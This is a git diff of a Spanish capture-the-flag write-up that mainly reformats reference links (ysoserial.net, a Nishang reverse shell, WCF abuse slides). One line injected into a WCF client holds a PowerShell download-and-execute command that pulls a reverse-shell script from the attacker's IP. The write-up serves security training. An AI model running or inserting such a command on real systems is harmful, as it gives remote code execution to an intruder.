@@ -247,7 +247,7 @@ Para crear nuestro reverse shell, necesitamos tener el siguiente escenario listo
 ```
 Podemos encontrar la ultima version de Ysoserial aqui:
 
-https://github.com/pwntester/ysoserial.net/releases
+
 > * [https://github.com/pwntester/ysoserial.net/releases](https://github.com/pwntester/ysoserial.net/releases)
 
 El reverse shell de Nishang aqui:
@@ -277,8 +277,8 @@ En el path `C:\users\lars\Documents>` encontramos lo siguiente:
 
 Documentandonos un poco desde:
 
-http://dotnetuy.com/blog/2018/02/14/tutorial-wcf-primera-parte-conceptos-basicos-de-wcf-windows-communication-foundation/
-https://downloads.immunityinc.com/infiltrate2019-slidepacks/christopher-anastasio-abusing-insecure-wcf-endpoints-for-profit-and-fun/abusing_wcf_endpoints.pdf
+> * [http://dotnetuy.com/blog/2018/02/14/tutorial-wcf-primera-parte-conceptos-basicos-de-wcf-windows-communication-foundation/](http://dotnetuy.com/blog/2018/02/14/tutorial-wcf-primera-parte-conceptos-basicos-de-wcf-windows-communication-foundation/)
+> * [https://downloads.immunityinc.com/infiltrate2019-slidepacks/christopher-anastasio-abusing-insecure-wcf-endpoints-for-profit-and-fun/abusing_wcf_endpoints.pdf](https://downloads.immunityinc.com/infiltrate2019-slidepacks/christopher-anastasio-abusing-insecure-wcf-endpoints-for-profit-and-fun/abusing_wcf_endpoints.pdf)
 
 Dentro de la carpeta `wcf` nos damos cuenta que es un proyecto en visual studio, procedemos a comprimir y guardarlo en la ruta compartida `dev`
 
@@ -298,7 +298,9 @@ Asi que basicamente descubrimos el client usa IWcfService para conectarse a los 
 
 Intentaremos inyectar codigo malicioso en el proyecto que encontramos y compilamos.
 
-Codigo a agregar: `Console.WriteLine(client.InvokePowerShell("IEX (new-object net.webclient).downloadstring('http://nuestraIP/Invoke-PowerShellTcp.ps1')"));`
+Codigo a agregar: 
+
+Console.WriteLine(client.InvokePowerShell("IEX (new-object net.webclient).downloadstring('http://nuestraIP/Invoke-PowerShellTcp.ps1')"));
 
 ![](/assets/img/Linux/Sharp/wcf_04.png)
 
